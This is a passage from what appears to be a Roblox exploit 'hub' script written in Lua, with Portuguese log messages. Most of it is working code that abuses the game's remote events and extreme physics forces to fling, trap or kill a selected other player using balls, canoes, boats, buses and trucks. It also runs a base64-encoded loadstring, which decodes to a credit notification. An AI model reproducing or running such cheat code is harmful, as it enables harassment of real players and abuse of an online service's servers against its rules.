									BodyVelocity.Velocity = Vector3.new(math.random(-5, 5), 5, math.random(-5, 5)).Unit * 1000000 + Vector3.new(0, 1000000, 0)
									BodyVelocity.Parent = HumanoidRootPart2
									task.wait(0.5)
									pcall(function()
										v592:FireServer("DeleteAllVehicles")
									end)

									if BodyVelocity then
										BodyVelocity:Destroy()
									end

									if connection then
										connection:Disconnect()
									end

									pcall(function()
										HumanoidRootPart2.Anchored = true
										HumanoidRootPart2.CFrame = CFrame.new(Position + Vector3.new(0, 5, 0))
										task.wait(0.2)
										HumanoidRootPart2.Velocity = Vector3.zero
										HumanoidRootPart2.RotVelocity = Vector3.zero
										HumanoidRootPart2.Anchored = false
										Humanoid2:ChangeState(Enum.HumanoidStateType.GettingUp)
									end)
								end
							end)

							return
						end
					end
				end

				return
			end
		end
	end
	local function v615(p59)
		loadstring(base64.decode("bG9jYWwgU3RhcnRlckd1aSA9IGdhbWU6R2V0U2VydmljZSgiU3RhcnRlckd1aSIpCgpTdGFydGVyR3VpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLCB7CiAgICBUaXRsZSA9ICJDaGFvcyBIdWIgVjIgQmFsbCBGbGluZyIsCiAgICBUZXh0ID0gIkJ5IFZlbm9tIiwKICAgIER1cmF0aW9uID0gNQp9KQ=="))()

		local Players4 = game:GetService("Players")
		local LocalPlayer4 = Players4.LocalPlayer
		local Character2 = LocalPlayer4.Character or LocalPlayer4.CharacterAdded:Wait()
		local Humanoid2 = Character2:WaitForChild("Humanoid")

		Character2:WaitForChild("HumanoidRootPart")

		local Backpack = LocalPlayer4:WaitForChild("Backpack")
		local v621 = workspace.WorkspaceCom:WaitForChild("001_SoccerBalls")
		local n12 = 45
		local n13 = 2.5

		local function v624()
			if not Backpack:FindFirstChild("SoccerBall") then
				game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "SoccerBall")
			end

			repeat
				task.wait()
			until Backpack:FindFirstChild("SoccerBall")

			Backpack.SoccerBall.Parent = Character2

			local t31 = { (CFrame.new(-49.3473244, 3.02302551, -46.5918579, 0.995210409, -4.55376314e-09, -0.0977558419, 4.24091562e-09, 1, -3.40807871e-09, 0.0977558419, 2.97718117e-09, 0.995210409)) }

			Character2:WaitForChild("SoccerBall", 9e9):WaitForChild("FootballInteraction", 9e9):FireServer(unpack(t31))

			repeat
				task.wait()
			until v621:FindFirstChild("Soccer" .. LocalPlayer4.Name)

			Character2.SoccerBall.Parent = Backpack

			return v621:FindFirstChild("Soccer" .. LocalPlayer4.Name)
		end

		local v626 = v621:FindFirstChild("Soccer" .. LocalPlayer4.Name) or v624()

		v626.CanCollide = false
		v626.Massless = true
		v626.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0, 0)

		if p59 ~= LocalPlayer4 then
			local Character3 = p59.Character

			if Character3 and Character3:FindFirstChild("HumanoidRootPart") and Character3:FindFirstChild("Humanoid") then
				local HumanoidRootPart2 = Character3.HumanoidRootPart
				local Humanoid3 = Character3.Humanoid

				if v626:FindFirstChildWhichIsA("BodyVelocity") then
					v626:FindFirstChildWhichIsA("BodyVelocity"):Destroy()
				end

				local BodyVelocity = Instance.new("BodyVelocity")

				BodyVelocity.Name = "FlingPower"
				BodyVelocity.Velocity = Vector3.new(0, 9e9, 0)
				BodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
				BodyVelocity.P = math.huge
				BodyVelocity.Parent = v626
				workspace.CurrentCamera.CameraSubject = Humanoid3

				local now = os.time()

				repeat
					if HumanoidRootPart2.Velocity.Magnitude > 0 then
						local v632 = HumanoidRootPart2.Position.X + HumanoidRootPart2.Velocity.X / 3
						local v633 = HumanoidRootPart2.Position.Y + HumanoidRootPart2.Velocity.Y / 3
						local v634 = HumanoidRootPart2.Position.Z + HumanoidRootPart2.Velocity.Z / 3
						local v635 = -1 + math.sin(tick() * n12) * n13
						local vector3 = Vector3.new(v632, v633, v634)

						n12 = 45
						n13 = 10
						v626.CFrame = CFrame.new(vector3) * CFrame.new(0, v635, 0)
						v626.Orientation += Vector3.new(45, 60, 30)
					else
						n13 = 5
						n12 = 10
						v626.CFrame = HumanoidRootPart2.CFrame * CFrame.new(0, -1 + math.sin(tick() * n12) * n13, 0)
					end

					task.wait()
				until HumanoidRootPart2.Velocity.Magnitude > 1000 or Humanoid3.Health <= 0 or not Character3:IsDescendantOf(workspace) or p59.Parent ~= Players4 or tick() - now >= 5

				workspace.CurrentCamera.CameraSubject = Humanoid2
			end
		end
	end

	local Players4 = game:GetService("Players")
	local LocalPlayer4 = Players4.LocalPlayer

	local function v639(p60)
		for _, child in pairs(LocalPlayer4.Backpack:GetChildren()) do
			if child.Name == p60 then
				return true
			end
		end

		return false
	end
	local function v642(p61)
		local v643 = LocalPlayer4.Backpack:FindFirstChild(p61)

		if v643 then
			LocalPlayer4.Character.Humanoid:EquipTool(v643)
		end
	end
	local function v644(p62)
		local v645 = LocalPlayer4.Character:FindFirstChild(p62)

		if v645 then
			v645.Parent = LocalPlayer4.Backpack
		end
	end
	local function v646(p63)
		if not v639("Couch") then
			game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack({
				"PickingTools",
				"Couch"
			}))
		end

		v642("Couch")
		getgenv().flingloop = true

		while getgenv().flingloop do
			local function v647()
				local Players5 = game:GetService("Players")
				local LocalPlayer5 = Players5.LocalPlayer

				local function v650(p64)
					local Character2 = LocalPlayer5.Character
					local Humanoid2 = Character2 and Character2:FindFirstChildOfClass("Humanoid")
					local RootPart = Humanoid2 and Humanoid2.RootPart
					local Character3 = p64.Character
					local Humanoid3
					local RootPart2
					local Head
					local Accessory
					local Handle

					if Character3:FindFirstChildOfClass("Humanoid") then
						Humanoid3 = Character3:FindFirstChildOfClass("Humanoid")
					end

					if Humanoid3 and Humanoid3.RootPart then
						RootPart2 = Humanoid3.RootPart
					end

					if Character3:FindFirstChild("Head") then
						Head = Character3.Head
					end

					if Character3:FindFirstChildOfClass("Accessory") then
						Accessory = Character3:FindFirstChildOfClass("Accessory")
					end

					if Accessory and Accessory:FindFirstChild("Handle") then
						Handle = Accessory.Handle
					end

					if Character2 and Humanoid2 and RootPart then
						if RootPart.Velocity.Magnitude < 50 then
							getgenv().OldPos = RootPart.CFrame
						end

						if Humanoid3 and Humanoid3.Sit then
							v644("Couch")
							getgenv().flingloop = false

							return
						end

						if Head then
							workspace.CurrentCamera.CameraSubject = Head
						elseif Handle then
							workspace.CurrentCamera.CameraSubject = Handle
						elseif Humanoid3 and RootPart2 then
							workspace.CurrentCamera.CameraSubject = Humanoid3
						end

						if not Character3:FindFirstChildWhichIsA("BasePart") then
							return
						end

						local function v660(p65, p66, p67)
							RootPart.CFrame = CFrame.new(p65.Position) * p66 * p67
							Character2:SetPrimaryPartCFrame(CFrame.new(p65.Position) * p66 * p67)
							RootPart.Velocity = Vector3.new(90000000, 900000000, 90000000)
							RootPart.RotVelocity = Vector3.new(900000000, 900000000, 900000000)
						end
						local function v661(p68)
							local now = tick()
							local n14 = 0

							while RootPart and Humanoid3 do
								if p68.Velocity.Magnitude < 50 then
									n14 += 100
									v660(p68, CFrame.new(0, 1.5, 0) + Humanoid3.MoveDirection * p68.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(n14), 0, 0))
									task.wait()
									v660(p68, CFrame.new(0, -1.5, 0) + Humanoid3.MoveDirection * p68.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(n14), 0, 0))
									task.wait()
									v660(p68, CFrame.new(2.25, 1.5, -2.25) + Humanoid3.MoveDirection * p68.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(n14), 0, 0))
									task.wait()
									v660(p68, CFrame.new(-2.25, -1.5, 2.25) + Humanoid3.MoveDirection * p68.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(n14), 0, 0))
									task.wait()
									v660(p68, CFrame.new(0, 1.5, 0) + Humanoid3.MoveDirection, CFrame.Angles(math.rad(n14), 0, 0))
									task.wait()
									v660(p68, CFrame.new(0, -1.5, 0) + Humanoid3.MoveDirection, CFrame.Angles(math.rad(n14), 0, 0))
									task.wait()
								else
									v660(p68, CFrame.new(0, 1.5, Humanoid3.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
									task.wait()
									v660(p68, CFrame.new(0, -1.5, -Humanoid3.WalkSpeed), CFrame.Angles(0, 0, 0))
									task.wait()
									v660(p68, CFrame.new(0, 1.5, Humanoid3.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
									task.wait()
									v660(p68, CFrame.new(0, 1.5, RootPart2.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
									task.wait()
									v660(p68, CFrame.new(0, -1.5, -RootPart2.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
									task.wait()
									v660(p68, CFrame.new(0, 1.5, RootPart2.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
									task.wait()
									v660(p68, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
									task.wait()
									v660(p68, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
									task.wait()
									v660(p68, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(-90), 0, 0))
									task.wait()
									v660(p68, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
									task.wait()
								end

								if p68.Velocity.Magnitude > 500 or p68.Parent ~= p64.Character or p64.Parent ~= Players5 or not p64.Character == Character3 or Humanoid3.Sit or Humanoid2.Health <= 0 or now + 2 < tick() or getgenv().flingloop == false then
									break
								end
							end
						end

						workspace.FallenPartsDestroyHeight = (0/0)

						local BodyVelocity = Instance.new("BodyVelocity")

						BodyVelocity.Name = "SpeedDoPai"
						BodyVelocity.Parent = RootPart
						BodyVelocity.Velocity = Vector3.new(900000000, 900000000, 900000000)
						BodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
						Humanoid2:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

						if RootPart2 and Head then
							if (RootPart2.CFrame.p - Head.CFrame.p).Magnitude > 5 then
								v661(Head)
							else
								v661(RootPart2)
							end
						elseif RootPart2 and not Head then
							v661(RootPart2)
						elseif not RootPart2 and Head then
							v661(Head)
						elseif not RootPart2 and not Head and Accessory and Handle then
							v661(Handle)
						end

						BodyVelocity:Destroy()
						Humanoid2:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
						workspace.CurrentCamera.CameraSubject = Humanoid2

						repeat
							RootPart.CFrame = getgenv().OldPos * CFrame.new(0, 0.5, 0)
							Character2:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, 0.5, 0))
							Humanoid2:ChangeState("GettingUp")
							table.foreach(Character2:GetChildren(), function(p69, p70)
								if p70:IsA("BasePart") then
									local vector3 = Vector3.new()
									local vector32 = Vector3.new()

									p70.Velocity = vector3
									p70.RotVelocity = vector32
								end
							end)
							task.wait()
						until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25

						workspace.FallenPartsDestroyHeight = getgenv().FPDH
					end
				end

				if p63 then
					v650(p63)
				end

				task.wait()
			end

			wait()
			pcall(v647)
		end
	end

	v126:AddSection({
		Name = "Canoe"
	})
	v126:AddButton({
		Name = "Kill Canoe",
		Callback = function()
			local Target = getgenv().Target

			if not Target then
				warn("Nenhum jogador definido.")

				return
			end

			local v668 = game.Players:FindFirstChild(Target)

			if not v668 then
				warn("Jogador não encontrado.")

				return
			end

			local LocalPlayer5 = game.Players.LocalPlayer
			local Character2 = LocalPlayer5.Character or LocalPlayer5.CharacterAdded:Wait()
			local Humanoid2 = Character2:WaitForChild("Humanoid")
			local HumanoidRootPart2 = Character2:WaitForChild("HumanoidRootPart")

			if Humanoid2.Sit then
				Humanoid2.Sit = false
				task.wait(0.5)
			end

			HumanoidRootPart2.CFrame = workspace.WorkspaceCom["001_CanoeCloneButton"].Button.CFrame
			task.wait(0.4)
			fireclickdetector(workspace.WorkspaceCom["001_CanoeCloneButton"].Button.ClickDetector, 0)
			task.wait(0.4)

			local Canoe = workspace.WorkspaceCom["001_CanoeStorage"].Canoe
			local VehicleSeat = Canoe:FindFirstChild("VehicleSeat")

			if not Canoe.PrimaryPart then
				Canoe.PrimaryPart = VehicleSeat
			end

			local n15 = 0

			while true do
				Character2:MoveTo(VehicleSeat.Position + Vector3.new(0, 3, 0))
				task.wait(0.01)
				VehicleSeat:Sit(Humanoid2)
				n15 += 1

				if Humanoid2.Sit then
					break
				elseif n15 > 100 then
					break
				end
			end

			if not Humanoid2.Sit then
				warn("Falhou em sentar no barco.")

				return
			end

			local Character3 = v668.Character or v668.CharacterAdded:Wait()
			local HumanoidRootPart3 = Character3:WaitForChild("HumanoidRootPart")
			local Humanoid3 = Character3:WaitForChild("Humanoid")
			local BodyForce = Instance.new("BodyForce", Canoe.PrimaryPart)
			local BodyAngularVelocity = Instance.new("BodyAngularVelocity", Canoe.PrimaryPart)

			BodyAngularVelocity.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
			BodyAngularVelocity.AngularVelocity = Vector3.new(5000, 25000, 5000)
			BodyAngularVelocity.P = 1e9

			local u681 = true
			local n16 = 0
			local connection

			connection = game:GetService("RunService").Heartbeat:Connect(function(dt)
				if not u681 or not Humanoid2.Sit or not Character3 or not Humanoid3 or Humanoid3.Health <= 0 then
					connection:Disconnect()
					BodyAngularVelocity:Destroy()
					BodyForce:Destroy()

					return
				end

				n16 += dt

				if not Humanoid3.SeatPart then
					local v684 = 5 + math.sin(n16 * 10) * 15 / 2
					local v685 = 50 * n16
					local v686 = math.cos(v685) * v684
					local v687 = math.sin(v685) * v684
					local v688 = HumanoidRootPart3.CFrame.LookVector * math.sin(n16 * 8) * 10

					Canoe:SetPrimaryPartCFrame(CFrame.new(HumanoidRootPart3.Position + Vector3.new(v686, 5, v687) + v688, HumanoidRootPart3.Position))
					BodyForce.Force = (HumanoidRootPart3.Position - Canoe.PrimaryPart.Position).Unit * 1000000 + Vector3.new(0, workspace.Gravity * Canoe.PrimaryPart:GetMass(), 0)

					return
				end

				local cFrame = CFrame.new(0, -12000, 0)

				for i = 1, 30 do
					Canoe:SetPrimaryPartCFrame(cFrame)
					Character2:SetPrimaryPartCFrame(cFrame)
					Character3:SetPrimaryPartCFrame(cFrame)
					task.wait()
				end

				if VehicleSeat then
					VehicleSeat.Throttle = 0
					VehicleSeat.Steer = 0
				end

				if Canoe:FindFirstChild("BodyVelocity") then
					Canoe.BodyVelocity.Velocity = Vector3.new(0, 0, 0)
				end

				if Canoe:FindFirstChild("BodyAngularVelocity") then
					Canoe.BodyAngularVelocity.AngularVelocity = Vector3.new(0, 0, 0)
				end

				if HumanoidRootPart2.Position.Y < -1000 then
					Humanoid2.Sit = false
					task.wait(0.2)
					HumanoidRootPart2.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
					task.wait(0.2)
					pcall(function()
						if Canoe and Canoe.Parent then
							Canoe:Destroy()
						end
					end)
				end

				u681 = false
				connection:Disconnect()
				BodyAngularVelocity:Destroy()
				BodyForce:Destroy()
			end)
		end
	})
	v126:AddSection({
		Name = "Fling"
	})

	local u691 = true

	v126:AddButton({
		Name = "Fling Bus [NEW]",
		Callback = function()
			if u132 then
				if game:GetService("Players"):FindFirstChild(u132) then
					v593(game:GetService("Players")[u132])
				end
			end
		end
	})
	v126:AddToggle({
		Name = "Fling - Boat",
		Default = false,
		Callback = function(p71)
			if u691 then
				u691 = false

				return
			end

			if p71 then
				if u132 then
					if game.Players:FindFirstChild(u132) then
						local LocalPlayer5 = game.Players.LocalPlayer
						local Character2 = LocalPlayer5.Character
						local Humanoid2 = Character2 and Character2:FindFirstChildOfClass("Humanoid")
						local HumanoidRootPart2 = Character2 and Character2:FindFirstChild("HumanoidRootPart")
						local Vehicles = game.Workspace:FindFirstChild("Vehicles")

						if not Humanoid2 or not HumanoidRootPart2 then
							warn("Humanoid ou RootPart inválido")

							return
						end

						local function v697()
							HumanoidRootPart2.CFrame = CFrame.new(1754, -2, 58)
							task.wait(0.5)
							game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingBoat", "MilitaryBoatFree")
							task.wait(1)

							return Vehicles:FindFirstChild(LocalPlayer5.Name .. "Car")
						end

						local v698 = Vehicles:FindFirstChild(LocalPlayer5.Name .. "Car") or v697()

						if not v698 then
							warn("Falha ao spawnar o barco")

							return
						end

						local VehicleSeat = v698:FindFirstChild("Body") and v698.Body:FindFirstChild("VehicleSeat")

						if not VehicleSeat then
							warn("Assento não encontrado")

							return
						end

						repeat
							task.wait(0.1)
							HumanoidRootPart2.CFrame = VehicleSeat.CFrame * CFrame.new(0, 1, 0)
						until Humanoid2.SeatPart == VehicleSeat

						print("Barco spawnado!")

						local v700 = game.Players:FindFirstChild(u132)

						if v700 then
							if v700.Character then
								local Character3 = v700.Character
								local Humanoid3 = Character3:FindFirstChildOfClass("Humanoid")
								local HumanoidRootPart3 = Character3:FindFirstChild("HumanoidRootPart")

								if not HumanoidRootPart3 or not Humanoid3 then
									warn("Humanoid ou RootPart do alvo não encontrado")

									return
								end

								local BodyAngularVelocity = Instance.new("BodyAngularVelocity")

								BodyAngularVelocity.Name = "Spinning"
								BodyAngularVelocity.Parent = v698.PrimaryPart
								BodyAngularVelocity.MaxTorque = Vector3.new(0, math.huge, 0)
								BodyAngularVelocity.AngularVelocity = Vector3.new(0, 369, 0)
								print("Fling ativo!")

								local function v705(p72, p73)
									if v698 and v698.PrimaryPart then
										v698:SetPrimaryPartCFrame(CFrame.new(p72.Position + p73))
									end
								end

								task.spawn(function()
									while v698 and v698.Parent do
										if not HumanoidRootPart3 or not HumanoidRootPart3.Parent then
											break
										end

										task.wait(0.01)
										v705(HumanoidRootPart3, Vector3.new(0, 1, 0))
										v705(HumanoidRootPart3, Vector3.new(0, -2.25, 5))
										v705(HumanoidRootPart3, Vector3.new(0, 2.25, 0.25))
										v705(HumanoidRootPart3, Vector3.new(-2.25, -1.5, 2.25))
										v705(HumanoidRootPart3, Vector3.new(0, 1.5, 0))
										v705(HumanoidRootPart3, Vector3.new(0, -1.5, 0))

										if v698 then
											if v698.PrimaryPart then
												local cFrame = CFrame.Angles(math.rad(math.random(-369, 369)), math.rad(math.random(-369, 369)), math.rad(math.random(-369, 369)))

												v698:SetPrimaryPartCFrame(CFrame.new(HumanoidRootPart3.Position + Vector3.new(0, 1.5, 0)) * cFrame)
											end
										end
									end

									if BodyAngularVelocity and BodyAngularVelocity.Parent then
										BodyAngularVelocity:Destroy()
										print("Fling desativado")
									end
								end)

								return
							end
						end

						warn("Jogador não encontrado")

						return
					end
				end

				warn("Nenhum jogador selecionado ou não existe")

				return
			end

			local LocalPlayer5 = game.Players.LocalPlayer
			local Character2 = LocalPlayer5.Character
			local HumanoidRootPart2 = Character2 and Character2:FindFirstChild("HumanoidRootPart")
			local Humanoid2 = Character2 and Character2:FindFirstChildOfClass("Humanoid")
			local Vehicles = game.Workspace:FindFirstChild("Vehicles")

			if not HumanoidRootPart2 or not Humanoid2 then
				warn("Nenhum RootPart ou Humanoid encontrado!")

				return
			end

			Humanoid2.PlatformStand = true
			print("Jogador paralisado para reduzir efeitos do spin.")

			for _, child in pairs(HumanoidRootPart2:GetChildren()) do
				if child:IsA("BodyAngularVelocity") or child:IsA("BodyVelocity") then
					child:Destroy()
				end
			end

			print("Spin e forças removidas do jogador.")
			game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("DeleteAllVehicles")
			task.wait(0.5)

			local v714 = Vehicles and Vehicles:FindFirstChild(LocalPlayer5.Name .. "Car")

			if v714 and v714.PrimaryPart then
				for _, child in pairs(v714.PrimaryPart:GetChildren()) do
					if child:IsA("BodyAngularVelocity") or child:IsA("BodyVelocity") then
						child:Destroy()
					end
				end

				print("Spin removido do barco.")
			end

			task.wait(1)

			local vector3 = Vector3.new(0, 1000, 0)
			local BodyPosition = Instance.new("BodyPosition", HumanoidRootPart2)

			BodyPosition.Position = vector3
			BodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

			local BodyGyro = Instance.new("BodyGyro", HumanoidRootPart2)

			BodyGyro.CFrame = HumanoidRootPart2.CFrame
			BodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
			print("Jogador está preso na coordenada segura.")
			task.wait(3)
			BodyPosition:Destroy()
			BodyGyro:Destroy()
			Humanoid2.PlatformStand = false
			print("Jogador liberado, seguro na posição.")
		end
	})
	print("Fling - Boat button created")

	local u720 = true

	v126:AddToggle({
		Name = "Fling Ball",
		Default = false,
		Callback = function(p74)
			local LocalPlayer5 = game:GetService("Players").LocalPlayer
			local Character2 = LocalPlayer5.Character or pl.CharacterAdded:Wait()
			local Backpack = LocalPlayer5.Backpack
			local v724 = workspace.WorkspaceCom:WaitForChild("001_SoccerBalls")

			if u720 then
				u720 = false

				return
			end

			if not p74 then
				return (function()
					if not Backpack:FindFirstChild("SoccerBall") then
						game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "SoccerBall")
					end

					repeat
						task.wait()
					until Backpack:FindFirstChild("SoccerBall")

					Backpack.SoccerBall.Parent = Character2

					local t32 = { (CFrame.new(-49.3473244, 3.02302551, -46.5918579, 0.995210409, -4.55376314e-09, -0.0977558419, 4.24091562e-09, 1, -3.40807871e-09, 0.0977558419, 2.97718117e-09, 0.995210409)) }

					Character2:WaitForChild("SoccerBall", 9e9):WaitForChild("FootballInteraction", 9e9):FireServer(unpack(t32))

					repeat
						task.wait()
					until v724:FindFirstChild("Soccer" .. LocalPlayer5.Name)

					Character2.SoccerBall.Parent = Backpack

					return v724:FindFirstChild("Soccer" .. LocalPlayer5.Name)
				end)()
			end

			local v726 = game:GetService("Players")[u132]

			v615(v726)
			pcall(function()
				if v726.Character.HumanoidRootPart.Velocity.Magnitude < 1000 then
					return v615(v)
				end
			end)
		end
	})

	local u727 = true

	v126:AddToggle({
		Name = "Fling Canoe",
		Description = "By Cafezin",
		Default = false,
		Callback = function(p75)
			if u727 then
				u727 = false

				return
			end

			if p75 then
				local Target = getgenv().Target

				if not Target then
					warn("Nenhum jogador definido.")

					return
				end

				local v729 = game.Players:FindFirstChild(Target)

				if not v729 then
					warn("Jogador não encontrado.")

					return
				end

				local LocalPlayer5 = game.Players.LocalPlayer
				local Character2 = LocalPlayer5.Character or LocalPlayer5.CharacterAdded:Wait()
				local Humanoid2 = Character2:WaitForChild("Humanoid")
				local HumanoidRootPart2 = Character2:WaitForChild("HumanoidRootPart")

				if Humanoid2.Sit then
					Humanoid2.Sit = false
					task.wait(0.5)
				end

				HumanoidRootPart2.CFrame = workspace.WorkspaceCom["001_CanoeCloneButton"].Button.CFrame
				task.wait(0.4)
				fireclickdetector(workspace.WorkspaceCom["001_CanoeCloneButton"].Button.ClickDetector, 0)
				task.wait(0.4)

				local Canoe = workspace.WorkspaceCom["001_CanoeStorage"].Canoe
				local VehicleSeat = Canoe:FindFirstChild("VehicleSeat")

				if not Canoe.PrimaryPart then
					Canoe.PrimaryPart = VehicleSeat
				end

				local n17 = 0

				while true do
					Character2:MoveTo(VehicleSeat.Position + Vector3.new(0, 3, 0))
					task.wait(0.01)
					VehicleSeat:Sit(Humanoid2)
					n17 += 1

					if Humanoid2.Sit then
						break
					elseif n17 > 100 then
						break
					end
				end

				if not Humanoid2.Sit then
					warn("Falhou em sentar no barco.")

					return
				end

				local Character3 = v729.Character or v729.CharacterAdded:Wait()
				local HumanoidRootPart3 = Character3:WaitForChild("HumanoidRootPart")
				local Humanoid3 = Character3:WaitForChild("Humanoid")
				local BodyForce = Instance.new("BodyForce", Canoe.PrimaryPart)
				local BodyAngularVelocity = Instance.new("BodyAngularVelocity", Canoe.PrimaryPart)

				BodyAngularVelocity.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
				BodyAngularVelocity.AngularVelocity = Vector3.new(5000, 25000, 5000)
				BodyAngularVelocity.P = 1e9

				local n18 = 0
				local connection

				connection = game:GetService("RunService").Heartbeat:Connect(function(dt)
					if Humanoid2.Sit and Character3 then
						if Humanoid3 then
							if not (Humanoid3.Health <= 0) then
								n18 += dt

								local v744 = 5 + math.sin(n18 * 10) * 15 / 2
								local v745 = 50 * n18
								local v746 = math.cos(v745) * v744
								local v747 = math.sin(v745) * v744
								local v748 = HumanoidRootPart3.CFrame.LookVector * math.sin(n18 * 35) * 35

								Canoe:SetPrimaryPartCFrame(CFrame.new(HumanoidRootPart3.Position + Vector3.new(v746, 5, v747) + v748, HumanoidRootPart3.Position))
								BodyForce.Force = (HumanoidRootPart3.Position - Canoe.PrimaryPart.Position).Unit * 1000000 + Vector3.new(0, workspace.Gravity * Canoe.PrimaryPart:GetMass(), 0)

								return
							end
						end
					end

					connection:Disconnect()
					BodyAngularVelocity:Destroy()
					BodyForce:Destroy()
				end)
			else
				getgenv().FlingAtivo = false

				local LocalPlayer5 = game.Players.LocalPlayer
				local Character2 = LocalPlayer5.Character or LocalPlayer5.CharacterAdded:Wait()
				local Humanoid2 = Character2:FindFirstChild("Humanoid")
				local HumanoidRootPart2 = Character2:FindFirstChild("HumanoidRootPart")

				if not Humanoid2 or not HumanoidRootPart2 then
					return
				end

				if Humanoid2.Sit then
					Humanoid2.Sit = false
					task.wait(0.3)
				end

				local WorkspaceCom = workspace:FindFirstChild("WorkspaceCom")

				if WorkspaceCom then
					local v754 = WorkspaceCom:FindFirstChild("001_CanoeStorage")

					if v754 and v754:FindFirstChild("Canoe") then
						pcall(function()
							v754.Canoe:Destroy()
						end)
					end
				end

				local RetornoPos = getgenv().RetornoPos or Vector3.new(1118.81, 75.998, -1138.61)

				HumanoidRootPart2.CFrame = CFrame.new(RetornoPos)

				local function v756()
					local v757 = game.Players:FindFirstChild(getgenv().Target)

					if v757 and v757.Character then
						for _, descendant in ipairs(v757.Character:GetDescendants()) do
							if descendant:IsA("BodyVelocity") or descendant:IsA("Attachment") then
								descendant:Destroy()
							end
						end
					end
				end

				Humanoid2:ChangeState(Enum.HumanoidStateType.Physics)
				HumanoidRootPart2.Anchored = true
				HumanoidRootPart2.CFrame = CFrame.new(RetornoPos)
				HumanoidRootPart2.AssemblyLinearVelocity = Vector3.zero
				HumanoidRootPart2.AssemblyAngularVelocity = Vector3.zero
				print("Jogador teleportado para a posição segura.")
				v756()
				task.wait(2)
				HumanoidRootPart2.Anchored = false
				Humanoid2:ChangeState(Enum.HumanoidStateType.GettingUp)
				print("Jogador liberado com segurança.")
			end
		end
	})

	local u760 = true

	v126:AddToggle({
		Name = "Truck Fling",
		Default = false,
		Callback = function(p76)
			if u760 then
				u760 = false

				return
			end

			if p76 then
				v416(u132)

				return
			end

			local Character2 = game.Players.LocalPlayer.Character
			local HumanoidRootPart2 = Character2 and Character2:FindFirstChild("HumanoidRootPart")
			local Humanoid2 = Character2 and Character2:FindFirstChildOfClass("Humanoid")

			game.Workspace:FindFirstChild("Vehicles")

			if not HumanoidRootPart2 or not Humanoid2 then
				warn("Nenhum RootPart ou Humanoid encontrado!")

				return
			end

			Humanoid2.PlatformStand = true
			print("Jogador paralisado para reduzir efeitos do spin.")

			for _, child in pairs(HumanoidRootPart2:GetChildren()) do
				if child:IsA("BodyAngularVelocity") or child:IsA("BodyVelocity") then
					child:Destroy()
				end
			end

			print("Spin e forças removidas do jogador.")
			game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("DeleteAllVehicles")
			task.wait()

			local vector3 = Vector3.new(0, 1000, 0)
			local BodyPosition = Instance.new("BodyPosition", HumanoidRootPart2)

			BodyPosition.Position = vector3
			BodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

			local BodyGyro = Instance.new("BodyGyro", HumanoidRootPart2)

			BodyGyro.CFrame = HumanoidRootPart2.CFrame
			BodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
			print("Jogador está preso na coordenada segura.")
			task.wait(3)
			BodyPosition:Destroy()
			BodyGyro:Destroy()
			Humanoid2.PlatformStand = false
			print("Jogador liberado, seguro na posição.")
		end
	})

	local u769 = true

	v126:AddToggle({
		Name = "Tow Truck Fling",
		Default = false,
		Callback = function(p77)
			if u769 then
				u769 = false

				return
			end

			if p77 then
				v566(u132)

				return
			end

			local Character2 = game.Players.LocalPlayer.Character
			local HumanoidRootPart2 = Character2 and Character2:FindFirstChild("HumanoidRootPart")
			local Humanoid2 = Character2 and Character2:FindFirstChildOfClass("Humanoid")

			game.Workspace:FindFirstChild("Vehicles")

			if not HumanoidRootPart2 or not Humanoid2 then
				warn("Nenhum RootPart ou Humanoid encontrado!")

				return
			end

			Humanoid2.PlatformStand = true
			print("Jogador paralisado para reduzir efeitos do spin.")

			for _, child in pairs(HumanoidRootPart2:GetChildren()) do
				if child:IsA("BodyAngularVelocity") or child:IsA("BodyVelocity") then
					child:Destroy()
				end
			end

			print("Spin e forças removidas do jogador.")
			game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("DeleteAllVehicles")
			task.wait()

			local vector3 = Vector3.new(0, 1000, 0)
			local BodyPosition = Instance.new("BodyPosition", HumanoidRootPart2)

			BodyPosition.Position = vector3
			BodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

			local BodyGyro = Instance.new("BodyGyro", HumanoidRootPart2)

			BodyGyro.CFrame = HumanoidRootPart2.CFrame
			BodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
			print("Jogador está preso na coordenada segura.")
			task.wait(3)
			BodyPosition:Destroy()
			BodyGyro:Destroy()
			Humanoid2.PlatformStand = false
			print("Jogador liberado, seguro na posição.")
		end
	})
	v126:AddSection({
		Name = "Click Kill Methods"
	})
